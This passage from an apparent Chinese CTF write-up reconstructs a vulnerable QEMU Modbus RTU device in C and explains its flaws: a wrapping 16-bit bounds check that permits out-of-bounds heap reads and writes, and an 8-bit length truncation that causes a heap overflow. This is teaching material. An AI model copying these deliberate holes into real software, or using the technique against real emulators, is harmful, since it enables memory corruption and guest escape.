将整个帧写到后端：与反编译里的 qemu_chr_fe_write_all(a1+152, ...) 相同语义 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_send</span><span class="params">(ModbusRtuState *s, <span class="type">const</span> <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    qemu_chr_fe_write_all(&amp;s-&gt;chr, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 发送 Modbus 异常应答帧：addr, (func|0x80), ex_code, CRC(lo,hi) */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_send_exception</span><span class="params">(ModbusRtuState *s, <span class="type">uint8_t</span> addr,</span></span><br><span class="line"><span class="params">                                  <span class="type">uint8_t</span> func, <span class="type">uint8_t</span> ex)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> out[<span class="number">5</span>];</span><br><span class="line">    out[<span class="number">0</span>] = addr;</span><br><span class="line">    out[<span class="number">1</span>] = (<span class="type">uint8_t</span>)(func | <span class="number">0x80</span>); <span class="comment">// 异常位：功能码最高位 1</span></span><br><span class="line">    out[<span class="number">2</span>] = ex;                     <span class="comment">// 异常码</span></span><br><span class="line">    <span class="type">uint16_t</span> crc = modbus_crc16(out, <span class="number">3</span>);</span><br><span class="line">    out[<span class="number">3</span>] = (<span class="type">uint8_t</span>)(crc &amp; <span class="number">0xFF</span>);  <span class="comment">// CRC 低字节在前</span></span><br><span class="line">    out[<span class="number">4</span>] = (<span class="type">uint8_t</span>)(crc &gt;&gt; <span class="number">8</span>);    <span class="comment">// CRC 高字节在后</span></span><br><span class="line">    modbus_send(s, out, <span class="keyword">sizeof</span>(out));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 功能码 0x03：读保持寄存器</span></span><br><span class="line"><span class="comment"> * 请求格式：addr, 0x03, start_hi, start_lo, count_hi, count_lo, crc_lo, crc_hi</span></span><br><span class="line"><span class="comment"> * 响应格式：addr, 0x03, byte_count, data..., crc_lo, crc_hi</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_handle_fc03</span><span class="params">(ModbusRtuState *s, <span class="type">const</span> <span class="type">uint8_t</span> *req)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> addr = req[<span class="number">0</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> start = be16_load(&amp;req[<span class="number">2</span>]); <span class="comment">// 起始寄存器地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> count = be16_load(&amp;req[<span class="number">4</span>]); <span class="comment">// 读取寄存器数量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界读 原因1：16位截断的环回校验】</span></span><br><span class="line">    <span class="comment">// 这里使用 (uint16_t)(start + count) 与 0x100 比较（仅 16 位），</span></span><br><span class="line">    <span class="comment">// 可构造“很大的 start + 小的 count”使得环回后仍 ≤ 0x100，从而绕过检查。</span></span><br><span class="line">    <span class="comment">// 但下面真正访问时用的是 regs[start + i]（按真实 start 索引，不截断），</span></span><br><span class="line">    <span class="comment">// 故当 start ≥ 256 时会从 regs 数组之外读取（OOB Read）。</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span> || (<span class="type">uint16_t</span>)(start + count) &gt; <span class="number">0x100</span>U) &#123;</span><br><span class="line">        <span class="comment">// 地址越界 -&gt; 异常码 0x02</span></span><br><span class="line">        modbus_send_exception(s, addr, MODBUS_FC_READ_HOLDING,</span><br><span class="line">                              MODBUS_EX_ILLEGAL_DATA_ADDR);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界读 说明2：稳定泄露与堆溢出的分界】</span></span><br><span class="line">    <span class="comment">// 下面把 2*count 放入 uint8_t（byte_count），当 count ≥ 128 时会发生 8 位截断，</span></span><br><span class="line">    <span class="comment">// 随后 out_len=3+byte_count+2 会“少分配”，而 for 循环仍按真实 count 拷贝数据，</span></span><br><span class="line">    <span class="comment">// 会导致堆溢出（这是附带的另一个漏洞）。为“稳定泄露 OOB 读”，建议 count ≤ 127。</span></span><br><span class="line">    <span class="type">uint8_t</span> byte_count = count * <span class="number">2</span>;               <span class="comment">// 8 位截断 → count≥128 时将发生“少分配”</span></span><br><span class="line">    <span class="type">size_t</span> out_len = <span class="number">3</span> + byte_count + <span class="number">2</span>;          <span class="comment">// addr, func, bc, data..., crc</span></span><br><span class="line">    <span class="type">uint8_t</span> *out = g_malloc(out_len);             <span class="comment">// 可能少分配（见上注）</span></span><br><span class="line"></span><br><span class="line">    out[<span class="number">0</span>] = addr;</span><br><span class="line">    out[<span class="number">1</span>] = MODBUS_FC_READ_HOLDING;</span><br><span class="line">    out[<span class="number">2</span>] = byte_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界读 触发点：真实访问 regs[start + i]】</span></span><br><span class="line">    <span class="comment">// 实际读出的内存区间（相对 regs 基址 B）：</span></span><br><span class="line">    <span class="comment">//   [ B + 2*start , B + 2*(start + count - 1) ]（总长度 2*count 字节）</span></span><br><span class="line">    <span class="comment">// 当 start 足够大时，将跨出 regs[256]（仅 512 字节），把后续堆对象数据打包返回。</span></span><br><span class="line">    <span class="type">size_t</span> p = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint16_t</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="type">uint16_t</span> v = s-&gt;regs[start + i];</span><br><span class="line">        out[p++] = (<span class="type">uint8_t</span>)(v &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        out[p++] = (<span class="type">uint8_t</span>)(v &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算并填充 CRC（低字节在前）</span></span><br><span class="line">    <span class="type">uint16_t</span> crc = modbus_crc16(out, out_len - <span class="number">2</span>);</span><br><span class="line">    out[out_len - <span class="number">2</span>] = (<span class="type">uint8_t</span>)(crc &amp; <span class="number">0xFF</span>);</span><br><span class="line">    out[out_len - <span class="number">1</span>] = (<span class="type">uint8_t</span>)(crc &gt;&gt; <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    modbus_send(s, out, out_len);</span><br><span class="line">    g_free(out);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 功能码 0x10：写多个保持寄存器</span></span><br><span class="line"><span class="comment"> * 请求格式：addr, 0x10, start(2), count(2), byte_count, data(2*count), crc(2)</span></span><br><span class="line"><span class="comment"> * 响应格式：addr, 0x10, start(2), count(2), crc(2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_handle_fc10</span><span class="params">(ModbusRtuState *s, <span class="type">const</span> <span class="type">uint8_t</span> *req)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> addr = req[<span class="number">0</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> start = be16_load(&amp;req[<span class="number">2</span>]); <span class="comment">// 起始寄存器地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> count = be16_load(&amp;req[<span class="number">4</span>]); <span class="comment">// 写入寄存器数量</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> byte_count = req[<span class="number">6</span>];         <span class="comment">// 数据字节数，须为 2*count</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界写 原因：同样的16位截断校验】</span></span><br><span class="line">    <span class="comment">// 这里也使用 (uint16_t)(start + count) ≤ 0x100 的 16 位环回判断，</span></span><br><span class="line">    <span class="comment">// 可构造“很大的 start + 小的 count”绕过检查，随后在实际写入 regs[start+i] 时</span></span><br><span class="line">    <span class="comment">// 对 regs 数组之外的内存进行覆盖（OOB Write）。</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span> || (<span class="type">uint16_t</span>)(start + count) &gt; <span class="number">0x100</span>U) &#123;</span><br><span class="line">        modbus_send_exception(s, addr, MODBUS_FC_WRITE_MULTIPLE,</span><br><span class="line">                              MODBUS_EX_ILLEGAL_DATA_ADDR);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 数据长度一致性检查：通过后才会执行真实写入</span></span><br><span class="line">    <span class="keyword">if</span> (byte_count != <span class="number">2</span> * count) &#123;</span><br><span class="line">        modbus_send_exception(s, addr, MODBUS_FC_WRITE_MULTIPLE,</span><br><span class="line">                              MODBUS_EX_ILLEGAL_DATA_VALUE);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 【漏洞-越界写 触发点：真实写 regs[start + i]】</span></span><br><span class="line"><span class="comment">     * 写入的内存区间（相对 regs 基址 B）：</span></span><br><span class="line"><span class="comment">     *   [ B + 2*start , B + 2*(start + count - 1) ]（总长度 2*count 字节）</span></span><br><span class="line"><span class="comment">     * 当 start 足够大时，将覆盖 regs 之后的其它对象/元数据/指针等。</span></span><br><span class="line"><span class="comment">     * 受接收缓冲 260 字节限制：0x10 总帧长 = 9 + byte_count ≤ 260 且 byte_count=2*count，</span></span><br><span class="line"><span class="comment">     * 因此 count ≤ 125，单帧最大可写 250 字节。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint16_t</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="type">uint16_t</span> v = be16_load(&amp;req[<span class="number">7</span> + <span class="number">2</span> * i]);</span><br><span class="line">        s-&gt;regs[start + i] = v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 响应为“回显”起始地址与数量（不回显数据体） */</span></span><br><span class="line">    <span class="type">uint8_t</span> out[<span class="number">8</span>];</span><br><span class="line">    out[<span class="number">0</span>] = addr;</span><br><span class="line">    out[<span class="number">1</span>] = MODBUS_FC_WRITE_MULTIPLE;</span><br><span class="line">    be16_store(&amp;out[<span class="number">2</span>], start);</span><br><span class="line">    be16_store(&amp;out[<span class="number">4</span>], count);</span><br><span class="line">    <span class="type">uint16_t</span> crc = modbus_crc16(out, <span class="number">6</span>);</span><br><span class="line">    out[<span class="number">6</span>] = (<span class="type">uint8_t</span>)(crc &amp; <span class="number">0xFF</span>);</span><br><span class="line">    out[<span class="number">7</span>] = (<span class="type">uint8_t</span>)(crc &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    modbus_send(s, out, <span class="keyword">sizeof</span>(out));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 试图从 rx_buf 中解析并处理一帧。</span></span><br><span class="line"><span class="comment"> * 若消耗了缓冲（即有进展）返回 true；否则返回 false 以等待更多数据。</span></span><br><span class="line"><span class="comment"> * 该逻辑严格复现题面片段的“帧长判定 / CRC 错 / 功能不支持 / 丢 1 字节”行为。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">modbus_try_parse</span><span class="params">(ModbusRtuState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;rx_len &lt;= <span class="number">3</span>) &#123; <span class="comment">// 至少需要 addr、func、后续长度字段/CRC 的一部分</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> *buf = s-&gt;rx_buf;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> addr = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> func = buf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> need = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (func == MODBUS_FC_READ_HOLDING) &#123;</span><br><span class="line">        need = <span class="number">8</span>; <span class="comment">/* 固定长度：addr func start(2) count(2) crc(2) */</span></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_len &lt; need) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 数据不够，继续等</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (func == MODBUS_FC_WRITE_MULTIPLE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_len &lt;= <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">/* 未到 byte_count 字段（第 7 字节） */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 【与接收上限相关】总长度 = 9 + byte_count；rx_buf 只有 260 字节，</span></span><br><span class="line">        <span class="comment">// 故 byte_count ≤ 251 → count ≤ floor(251/2) = 125</span></span><br><span class="line">        need = (<span class="type">size_t</span>)buf[<span class="number">6</span>] + <span class="number">9</span>; <span class="comment">/* addr func start(2) count(2) bc data crc(2) */</span></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_len &lt; need) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 数据不够，继续等</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 未知功能码：</span></span><br><span class="line"><span class="comment">         * - 若已收到 ≥4 字节，则按 Modbus 异常 0x01 回复，</span></span><br><span class="line"><span class="comment">         * - 然后仅丢弃 1 字节（地址），保持与反编译片段一致（非标准）。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_len &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        modbus_send_exception(s, addr, func, MODBUS_EX_ILLEGAL_FUNCTION);</span><br><span class="line">        memmove(s-&gt;rx_buf, s-&gt;rx_buf + <span class="number">1</span>, s-&gt;rx_len - <span class="number">1</span>); <span class="comment">// 左移 1 字节</span></span><br><span class="line">        s-&gt;rx_len -= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 有进展（丢了数据/发了应答）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CRC 校验：从帧头到 CRC 之前所有字节 */</span></span><br><span class="line">    <span class="type">uint16_t</span> rx_crc = (<span class="type">uint16_t</span>)(buf[need - <span class="number">2</span>] | (buf[need - <span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line">    <span class="type">uint16_t</span> want = modbus_crc16(buf, need - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (rx_crc != want) &#123;</span><br><span class="line">        <span class="comment">/* CRC 不匹配：丢弃 1 个字节并重试（滑动窗口），保持题面行为 */</span></span><br><span class="line">        memmove(s-&gt;rx_buf, s-&gt;rx_buf + <span class="number">1</span>, s-&gt;rx_len - <span class="number">1</span>);</span><br><span class="line">        s-&gt;rx_len -= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 单元 ID 过滤：地址匹配当前 unit-id 或广播地址(0x00)才处理</span></span><br><span class="line"><span class="comment">     * 注意：此实现特意保留“广播也回包”的题面行为（非标准）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (addr == s-&gt;unit_id || addr == <span class="number">0x00</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (func == MODBUS_FC_READ_HOLDING) &#123;</span><br><span class="line">            modbus_handle_fc03(s, buf);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (func == MODBUS_FC_WRITE_MULTIPLE) &#123;</span><br><span class="line">            modbus_handle_fc10(s, buf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 消耗掉这一整帧，继续解析下一帧（若有的话） */</span></span><br><span class="line">    memmove(s-&gt;rx_buf, s-&gt;rx_buf + need, s-&gt;rx_len - need);</span><br><span class="line">    s-&gt;rx_len -= need;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- 字符设备回调 ------------------------------------------------------ */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 后端“可读”回调：返回还能再读入多少字节（260 - 已占用） */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">modbus_can_read</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModbusRtuState *s = MODBUS_RTU(opaque);</span><br><span class="line">    <span class="comment">/* 对应反编译里的 return 260 - field_3D8; */</span></span><br><span class="line">    <span class="type">int</span> cap = (<span class="type">int</span>)(<span class="keyword">sizeof</span>(s-&gt;rx_buf) - s-&gt;rx_len);</span><br><span class="line">    <span class="keyword">return</span> cap &gt; <span class="number">0</span> ? cap : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 真正读入数据的回调：将数据追加到 rx_buf，并尽量解析 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_read</span><span class="params">(<span class="type">void</span> *opaque, <span class="type">const</span> <span class="type">uint8_t</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModbusRtuState *s = MODBUS_RTU(opaque);</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 截断写入，避免溢出（保持 260 上限）</span></span><br><span class="line">    <span class="type">size_t</span> n = size;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="keyword">sizeof</span>(s-&gt;rx_buf) - s-&gt;rx_len) &#123;</span><br><span class="line">        n = <span class="keyword">sizeof</span>(s-&gt;rx_buf) - s-&gt;rx_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(s-&gt;rx_buf + s-&gt;rx_len, buf, n);</span><br><span class="line">        s-&gt;rx_len += n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 只要还能“有进展”（解析掉一帧/丢 1 字节），就持续循环 */</span></span><br><span class="line">    <span class="keyword">while</span> (modbus_try_parse(s)) &#123;</span><br><span class="line">        <span class="comment">/* 空循环体，进展由 try_parse 控制 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 事件回调：当 chardev 打开时，复位接收长度（与题面 field_3D8=0 对齐） */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_event</span><span class="params">(<span class="type">void</span> *opaque, QEMUChrEvent event)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModbusRtuState *s = MODBUS_RTU(opaque);</span><br><span class="line">    <span class="keyword">if</span> (event == CHR_EVENT_OPENED) &#123;</span><br><span class="line">        s-&gt;rx_len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- QOM / QDev Glue（设备生命周期与属性） ----------------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModbusRtuState *s = MODBUS_RTU(dev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须已连接到某个 chardev 后端，否则报错</span></span><br><span class="line">    <span class="keyword">if</span> (!qemu_chr_fe_backend_connected(&amp;s-&gt;chr)) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Can&#x27;t create modbus-rtu device, empty char device&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空寄存器与接收缓冲</span></span><br><span class="line">    <span class="built_in">memset</span>(s-&gt;regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(s-&gt;regs));</span><br><span class="line">    s-&gt;rx_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 注册 chardev 回调处理函数（与新树/老树签名差异见下注） */</span></span><br><span class="line">    qemu_chr_fe_set_handlers(&amp;s-&gt;chr,</span><br><span class="line">                             modbus_can_read,</span><br><span class="line">                             modbus_read,</span><br><span class="line">                             modbus_event,</span><br><span class="line">                             s,</span><br><span class="line">                             <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果你的 QEMU 树需要旧版签名，请用：</span></span><br><span class="line"><span class="comment">     * qemu_chr_fe_set_handlers(&amp;s-&gt;chr, modbus_can_read, modbus_read,</span></span><br><span class="line"><span class="comment">     *                          modbus_event, NULL, s, NULL, true);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_unrealize</span><span class="params">(DeviceState *dev)</span></span><br><span class="line">&#123;</span><br><span class="line">    ModbusRtuState *s = MODBUS_RTU(dev);</span><br><span class="line">    <span class="comment">/* 解绑回调，清理前端 */</span></span><br><span class="line">    qemu_chr_fe_set_handlers(&amp;s-&gt;chr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设备属性：chardev 句柄与 unit-id（默认 1） */</span></span><br><span class="line"><span class="type">static</span> Property modbus_properties[] = &#123;</span><br><span class="line">    DEFINE_PROP_CHR(<span class="string">&quot;chardev&quot;</span>, ModbusRtuState, chr),</span><br><span class="line">    DEFINE_PROP_UINT8(<span class="string">&quot;unit-id&quot;</span>, ModbusRtuState, unit_id, <span class="number">1</span>),</span><br><span class="line">    DEFINE_PROP_END_OF_LIST(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 类初始化：挂接 realize/unrealize 与属性 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    dc-&gt;realize   = modbus_realize;</span><br><span class="line">    dc-&gt;unrealize = modbus_unrealize;</span><br><span class="line">    device_class_set_props(dc, modbus_properties);</span><br><span class="line">    <span class="comment">/* 反编译片段里涉及类别开关；此处使用默认分类即可。*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* QOM 类型信息：名称、父类、实例大小、类初始化 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo modbus_type_info = &#123;</span><br><span class="line">    .name          = TYPE_MODBUS_RTU,</span><br><span class="line">    .parent        = TYPE_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(ModbusRtuState),</span><br><span class="line">    .class_init    = modbus_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 模块注册入口：在 QEMU 启动时注册该设备类型 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;modbus_type_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(modbus_register_types);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>核心错误</strong>：代码把合法范围理解为“**(start + count) ≤ 0x100（256）<strong>”，但</strong>比较时做了 16 位截断**：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">uint16_t</span>)(start + count) &lt;= <span class="number">0x100</span></span><br></pre></td></tr></table></figure></div>

<p>这意味着你可以选一个<strong>很大的 start</strong>（例如接近 <code>0xFFFF</code>），再配一个小 <code>count</code>，让 <code>(start + count) &amp; 0xFFFF</code> <strong>环回（wrap-around）到一个很小的数</strong>，从而<strong>骗过检查</strong>。<br>然而真正读&#x2F;写时用的是 <strong><code>s-&gt;regs[start + i]</code><strong>（即按</strong>真实的 <code>start</code><strong>做索引），相当于对 256 大小的数组做了</strong>巨大正偏移</strong>，从而<strong>读&#x2F;写“数组之外”的内存</strong>。</p>
<blockquote>
<p>直观图（单位：字节；<code>regs</code> 占 512B）</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|&lt;-------------- ModbusRtuState（设备对象，堆上）-----------------------------&gt;|</span><br><span class="line">...  [ regs: 512 bytes ]  ...  [ 其他字段 / 其他堆块 / 其他映射 ... ]</span><br><span class="line">      ^基址 = regs_base</span><br><span class="line">访问地址 = regs_base + 2*(start + i)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>只要 <code>2*(start + i)</code> 远大于 512，就会“落到”<code>regs</code> 之后的其它内存（同一堆 arena 的<strong>别的对象&#x2F;元数据&#x2F;指针</strong>），从而形成：</p>
<ul>
<li><strong>0x03：越界读（OOB Read）</strong> —— 把外部内存读出来并打包发回；</li>
<li><strong>0x10：越界写（OOB Write）</strong> —— 把请求中的字节写到外部内存；配合 0x03 可做<strong>二次泄露</strong>或<strong>直接破坏对象&#x2F;堆</strong>。</li>
</ul>
<h3 id="0x03：越界读"><a href="#0x03：越界读" class="headerlink" title="0x03：越界读"></a>0x03：越界读</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 功能码 0x03：读保持寄存器</span></span><br><span class="line"><span class="comment"> * 请求格式：addr, 0x03, start_hi, start_lo, count_hi, count_lo, crc_lo, crc_hi</span></span><br><span class="line"><span class="comment"> * 响应格式：addr, 0x03, byte_count, data..., crc_lo, crc_hi</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modbus_handle_fc03</span><span class="params">(ModbusRtuState *s, <span class="type">const</span> <span class="type">uint8_t</span> *req)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint8_t</span> addr = req[<span class="number">0</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> start = be16_load(&amp;req[<span class="number">2</span>]); <span class="comment">// 起始寄存器地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint16_t</span> count = be16_load(&amp;req[<span class="number">4</span>]); <span class="comment">// 读取寄存器数量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【漏洞-越界读 原因1：16位截断的环回校验】</span></span><br><span class="line">    <span class="comment">// 这里使用 (uint16_t)(start + count) 与 0x100 比较（仅 16 位），</span></span><br><span class="line">    <span class="comment">// 可构造“很大的 start + 小的 count”使得环回后仍 ≤ 0x100，从而绕过检查。</span></span><br><span class="line">    <span class="comment">// 但下面真正访问时用的是 regs[start + i]（按真实 start 索引，不截断），</span></span><br><span class="line">    <span class="comment">// 故当 start ≥ 256 时会从 regs 数组之外读取（OOB Read）。</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span> || (<span class="type">uint16_t</span>)(start + count) &gt; <span class="number">0x100</span>U) &#123;</span><br><span class="line">        <span class="comment">// 地址越界 -&gt; 异常码 